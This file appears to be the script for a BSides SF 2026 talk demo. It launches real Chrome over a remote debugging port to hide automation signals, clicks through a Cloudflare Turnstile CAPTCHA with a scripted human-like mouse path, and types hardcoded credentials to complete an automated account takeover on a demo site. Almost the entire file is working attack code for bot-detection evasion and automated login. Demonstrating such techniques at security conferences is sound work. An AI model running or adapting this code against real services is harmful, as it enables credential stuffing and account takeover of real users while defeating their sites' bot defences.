/**
 * BSides SF 2026 — "The Great Credential Caper"
 * Full ATO demo: bypass Turnstile → enter creds → log in → land on dashboard
 *
 * How it works:
 *   Launches a real Google Chrome with --remote-debugging-port, then connects
 *   Playwright via CDP. A real Chrome has no automation fingerprints —
 *   no navigator.webdriver, no cdc_ Runtime leaks, no Playwright signals.
 *   Turnstile sees a normal human browser and lets the click through.
 */

const { chromium } = require('playwright');
const { execSync, spawn } = require('child_process');
const path = require('path');

const CHROME = '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome';
const DEBUG_PORT = 9222;
const PROFILE_DIR = '/tmp/bsides-chrome-profile';
const TARGET = 'https://bsides.letsgochristo.com/';

(async () => {
  // ── 1. Launch a real Chrome ──────────────────────────────────────────
  try { execSync(`lsof -ti:${DEBUG_PORT} | xargs kill -9 2>/dev/null`); } catch {}

  console.log('╔══════════════════════════════════════════════════╗');
  console.log('║  BSides SF 2026 — The Great Credential Caper    ║');
  console.log('║  Automated Account Takeover Demo                ║');
  console.log('╚══════════════════════════════════════════════════╝\n');

  console.log('[1/6] Launching real Google Chrome (not Playwright-managed) ...');
  // Fresh profile every run to avoid restore prompts / stale state
  try { execSync(`rm -rf "${PROFILE_DIR}"`); } catch {}
  const chrome = spawn(CHROME, [
    `--remote-debugging-port=${DEBUG_PORT}`,
    `--user-data-dir=${PROFILE_DIR}`,
    '--no-first-run',
    '--no-default-browser-check',
    '--disable-session-crashed-bubble',
    '--disable-infobars',
    '--window-size=1280,800',
    'about:blank',
  ], { stdio: 'ignore', detached: true });
  chrome.unref();

  // Wait for debug port
  for (let i = 0; i < 20; i++) {
    try {
      execSync(`curl -s http://localhost:${DEBUG_PORT}/json/version`, { timeout: 2000 });
      break;
    } catch {
      await new Promise(r => setTimeout(r, 500));
    }
  }

  // ── 2. Connect Playwright to the running Chrome via CDP ──────────────
  console.log('[2/6] Connecting to Chrome via CDP ...');
  const browser = await chromium.connectOverCDP(`http://localhost:${DEBUG_PORT}`);
  const context = browser.contexts()[0];
  const page = context.pages()[0] || await context.newPage();

  // ── 3. Navigate to target ────────────────────────────────────────────
  console.log(`[3/6] Navigating to ${TARGET} ...`);
  await page.goto(TARGET, { waitUntil: 'load' });

  // Tag this session so the Worker can tell automated vs. human traffic apart
  await context.addCookies([{
    name: 'demo-source',
    value: 'cdp-bypass',
    domain: new URL(TARGET).hostname,
    path: '/',
  }]);

  // Wait for Turnstile to render
  console.log('      Waiting for Turnstile widget ...');
  const widget = await page.waitForSelector('.cf-turnstile', { timeout: 15000 });
  await page.waitForTimeout(5000);

  // ── 4. Solve Turnstile ───────────────────────────────────────────────
  console.log('[4/6] Clicking Turnstile checkbox ...');
  const box = await widget.boundingBox();
  const clickX = box.x + 20;
  const clickY = box.y + box.height / 2;

  // Human-like mouse path
  await page.mouse.move(200, 300, { steps: 5 });
  await page.waitForTimeout(120);
  await page.mouse.move(clickX - 30, clickY + 8, { steps: 10 });
  await page.waitForTimeout(80);
  await page.mouse.move(clickX, clickY, { steps: 6 });
  await page.waitForTimeout(60);
  await page.mouse.down();
  await page.waitForTimeout(50);
  await page.mouse.up();

  // Wait for token
  let token = '';
  for (let i = 0; i < 40; i++) {
    token = await page.$eval('[name="cf-turnstile-response"]', el => el.value).catch(() => '');
    if (token && token.length > 10) break;
    await page.waitForTimeout(500);
  }

  if (!token || token.length < 10) {
    console.log('\n❌  Turnstile did not pass. Aborting.');
    await browser.close();
    try { execSync(`lsof -ti:${DEBUG_PORT} | xargs kill -9 2>/dev/null`); } catch {}
    process.exit(1);
  }

  console.log('      ✅ Turnstile PASSED');
  await page.screenshot({ path: path.join(__dirname, 'demo-turnstile-passed.png') });

  // ── 5. Enter credentials and submit ──────────────────────────────────
  console.log('[5/6] Entering credentials (admin / Password123) ...');

  // Clear and type username
  await page.click('#username', { clickCount: 3 });
  await page.waitForTimeout(100);
  await page.keyboard.type('admin', { delay: 60 });

  // Clear and type password
  await page.click('#password', { clickCount: 3 });
  await page.waitForTimeout(100);
  await page.keyboard.type('Password123', { delay: 60 });

  await page.waitForTimeout(300);
  await page.screenshot({ path: path.join(__dirname, 'demo-creds-entered.png') });

  console.log('[6/6] Submitting login form ...');
  await page.click('button[type="submit"]');

  // ── 6. Wait for navigation to dashboard ──────────────────────────────
  // The login page does: window.location.href = '/dashboard.html?user=...'
  // Poll for either a URL change or the dashboard content appearing.
  let landed = false;
  for (let i = 0; i < 20; i++) {
    const url = page.url();
    if (url.includes('dashboard')) { landed = true; break; }
    await page.waitForTimeout(500);
  }

  if (landed) {
    await page.waitForTimeout(1000); // let dashboard fully render
    console.log('\n╔══════════════════════════════════════════════════╗');
    console.log('║  🔴  ACCOUNT TAKEOVER SUCCESSFUL                ║');
    console.log('║  Landed on dashboard — credentials accepted.    ║');
    console.log('╚══════════════════════════════════════════════════╝');
    console.log(`\n   URL: ${page.url()}`);
  } else {
    const errorText = await page.$eval('#error-msg', el => el.textContent).catch(() => '');
    if (errorText) {
      console.log(`\n❌  Login failed. Server said: ${errorText}`);
    } else {
      console.log(`\n⚠️   Unexpected state. Current URL: ${page.url()}`);
    }
  }

  await page.waitForTimeout(2000);
  await page.screenshot({ path: path.join(__dirname, 'demo-final.png') });

  console.log('\n   Screenshots saved to project root.');
  console.log('   Check /log.html on a second screen for the attack monitor.\n');

  // Keep browser open for 8 s so the audience sees the result
  await page.waitForTimeout(8000);
  await browser.close();
  try { execSync(`lsof -ti:${DEBUG_PORT} | xargs kill -9 2>/dev/null`); } catch {}
})();
